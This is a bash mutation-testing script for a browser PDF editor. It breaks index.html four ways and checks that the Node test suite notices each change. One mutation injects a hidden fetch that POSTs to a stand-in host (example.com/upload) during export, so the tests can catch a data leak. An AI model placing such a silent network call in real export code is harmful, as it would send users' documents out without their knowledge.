#!/usr/bin/env bash
# Mutation check: deliberately break the shipped file in four ways and confirm
# the suite notices each one. A test suite that passes against a mutated build
# is not testing anything, so this is the guard against a green suite that means
# nothing.
#
# Usage:  npm run test:mutate      (or: bash tests/mutation-check.sh)
set -uo pipefail
cd "$(dirname "$0")/.."

WORK=".mutation"
mkdir -p "$WORK"

pass=0
fail=0

# mutate <label> <find> <replace> [test-glob]
mutate () {
  local label="$1" find="$2" replace="$3" glob="${4:-tests/*.test.mjs}"
  local out status

  FIND="$find" REPLACE="$replace" python3 - <<'PY'
import os
src = open('index.html').read()
find, replace = os.environ['FIND'], os.environ['REPLACE']
if find not in src:
    raise SystemExit('mutation pattern not found in index.html: ' + find[:70])
open('.mutation/index.html', 'w').write(src.replace(find, replace, 1))
PY
  if [ $? -ne 0 ]; then
    printf '  !! %s: could not apply the mutation to index.html\n' "$label"
    fail=$((fail + 1))
    return
  fi

  out=$(KEITHROBAT_INDEX="$PWD/$WORK/index.html" node --test $glob 2>&1)
  status=$(printf '%s\n' "$out" | grep -E '^# fail|^ℹ fail' | head -1 | grep -oE '[0-9]+$')

  if [ "${status:-0}" -gt 0 ]; then
    printf '  caught   %s  (%s test(s) failed)\n' "$label" "$status"
    pass=$((pass + 1))
  else
    printf '  ESCAPED  %s  -- no test noticed this change\n' "$label"
    fail=$((fail + 1))
  fi
}

echo "baseline (unmutated) run:"
if node --test tests/*.test.mjs >/dev/null 2>&1; then
  echo "  ok       the suite passes before mutation"
else
  echo "  !!       the suite already fails without any mutation; fix that first"
  exit 1
fi

echo "mutations:"
mutate "z-order: fills no longer render first" \
  "for (var i = 0; i < (eds || []).length; i++) (eds[i].kind === 'fill' ? fills : rest).push(i);" \
  "for (var i = 0; i < (eds || []).length; i++) (eds[i].kind === 'fill' ? rest : fills).push(i);" \
  "tests/engine.test.mjs"

mutate "content-aware fill: stop rejecting neighbouring glyph ink" \
  "if (maxDev <= 14) {" \
  "if (maxDev <= 400) {" \
  "tests/engine.test.mjs tests/pixels.test.mjs"

mutate "privacy: app leaks the document to a server during export" \
  "doc.setProducer('Chadobe Keithrobat Pro CK');" \
  "doc.setProducer('Chadobe Keithrobat Pro CK'); try { fetch('https://example.com/upload', {method:'POST', body:'x'}); } catch(e) {}" \
  "tests/integration.test.mjs"

mutate "export metadata: producer branding dropped" \
  "doc.setProducer('Chadobe Keithrobat Pro CK');" \
  "doc.setProducer('');" \
  "tests/integration.test.mjs"

rm -rf "$WORK"

echo
if [ "$fail" -eq 0 ]; then
  echo "all $pass mutation(s) caught -- the suite is load-bearing."
  exit 0
fi
echo "$fail mutation(s) escaped, $pass caught. A green suite that survives these is not testing anything."
exit 1
